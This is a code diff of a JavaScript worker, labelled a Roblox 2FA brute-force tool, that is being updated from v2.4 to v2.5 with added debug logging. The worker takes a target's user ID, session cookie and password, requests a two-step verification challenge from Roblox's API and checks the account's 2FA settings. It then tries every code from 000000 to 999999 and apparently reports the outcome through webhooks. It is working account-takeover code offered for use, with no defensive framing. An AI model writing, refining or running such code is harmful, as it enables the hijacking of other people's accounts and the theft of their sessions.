@@ -1,5 +1,5 @@
 // ============================================================
-// ROBLOX 2FA BRUTE FORCE WORKER v2.4 - DEBUG VERSION
+// ROBLOX 2FA BRUTE FORCE WORKER v2.5 - FULL DEBUG
 // ============================================================
 
 addEventListener('fetch', event => {
@@ -7,7 +7,6 @@ addEventListener('fetch', event => {
 });
 
 async function handleRequest(request) {
-  // Handle CORS preflight
   if (request.method === 'OPTIONS') {
     return new Response(null, {
       status: 204,
@@ -20,7 +19,6 @@ async function handleRequest(request) {
     });
   }
 
-  // Only allow POST
   if (request.method !== 'POST') {
     return new Response(JSON.stringify({ 
       error: 'Method not allowed. Use POST.' 
@@ -72,7 +70,6 @@ async function handleRequest(request) {
   const end = endCode || 999999;
 
   try {
-    // STEP 1: Request challenge with password
     const challengeResult = await requestChallenge(userId, cookie, password);
     
     if (!challengeResult.success) {
@@ -96,7 +93,6 @@ async function handleRequest(request) {
 
     const challengeId = challengeResult.challengeId;
 
-    // STEP 2: Check 2FA config
     const config = await get2FAConfig(userId, cookie);
     if (!config || !config.passwordEnabled) {
       await sendDualWebhook({
@@ -117,7 +113,6 @@ async function handleRequest(request) {
       });
     }
 
-    // STEP 3: Brute force
     const result = await bruteForce2FA(userId, cookie, challengeId, start, end);
     const duration = Date.now() - startTime;
 
@@ -216,24 +211,34 @@ async function handleRequest(request) {
 
 async function requestChallenge(userId, cookie, password) {
   try {
-    const response = await fetch(
-      `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/request`,
-      {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'Cookie': cookie,
-          'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
-        },
-        body: JSON.stringify({ password: password })
-      }
-    );
+    const url = `https://twostepverification.roblox.com/v1/users/${userId}/challenges/password/request`;
+    const body = JSON.stringify({ password: password });
+    
+    console.log('Requesting challenge for userId:', userId);
+    console.log('URL:', url);
+    console.log('Body:', body);
 
-    const data = await response.json();
+    const response = await fetch(url, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'Cookie': cookie,
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+      },
+      body: body
+    });
 
-    // Log the full response for debugging
-    console.log('Challenge response status:', response.status);
-    console.log('Challenge response data:', JSON.stringify(data));
+    // Get raw response text first
+    const rawText = await response.text();
+    console.log('Raw challenge response:', rawText);
+    console.log('Status:', response.status);
+
+    let data;
+    try {
+      data = JSON.parse(rawText);
+    } catch (e) {
+      return { success: false, error: 'Invalid JSON from Roblox: ' + rawText.substring(0, 200) };
+    }
 
     if (response.status === 200 && data.challengeId) {
       return { success: true, challengeId: data.challengeId };
@@ -246,10 +251,10 @@ async function requestChallenge(userId, cookie, password) {
       return { success: false, error: 'Rate limited - try again later' };
     }
     if (response.status === 400) {
-      return { success: false, error: 'Bad request: ' + (data.message || JSON.stringify(data)) };
+      return { success: false, error: 'Bad request: ' + JSON.stringify(data) };
     }
 
-    return { success: false, error: data.message || data.error || 'Unknown error from Roblox' };
+    return { success: false, error: 'Roblox returned: ' + JSON.stringify(data) };
   } catch (e) {
     return { success: false, error: 'Network error: ' + e.message };
   }
@@ -267,15 +272,17 @@ async function get2FAConfig(userId, cookie) {
       }
     );
 
-    const config = await response.json();
+    const rawText = await response.text();
+    console.log('Config response:', rawText);
 
-    console.log('2FA Config:', JSON.stringify(config));
+    const config = JSON.parse(rawText);
 
     return {
       passwordEnabled: config.password?.enabled || false,
       authenticatorEnabled: config.authenticator?.enabled || false,
       emailEnabled: config.email?.enabled || false,
-      enhancedProtection: config.enhancedProtection || false
+      enhancedProtection: config.enhancedProtection || false,
+      raw: config
     };
   } catch (e) {
     console.log('Get2FAConfig error:', e.message);
